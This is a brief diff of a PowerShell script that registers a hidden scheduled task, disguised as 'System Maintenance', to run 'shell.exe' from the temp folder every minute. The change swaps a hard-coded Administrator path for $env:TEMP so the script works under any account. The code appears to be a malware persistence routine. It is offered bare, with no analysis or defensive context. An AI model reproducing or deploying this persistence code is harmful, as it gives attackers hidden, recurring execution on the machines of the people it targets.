@@ -1,5 +1,5 @@
 $taskName = "System Maintenance"
-$exePath = "C:\Users\Administrator\AppData\Local\Temp\shell.exe"
+$exePath = "$env:TEMP\shell.exe"
 $action = New-ScheduledTaskAction -Execute $exePath
 $trigger = New-ScheduledTaskTrigger -Once -At ((Get-Date).AddMinutes(1)) -RepetitionInterval (New-TimeSpan -Minutes 1)
 $settings = New-ScheduledTaskSettingsSet -Hidden
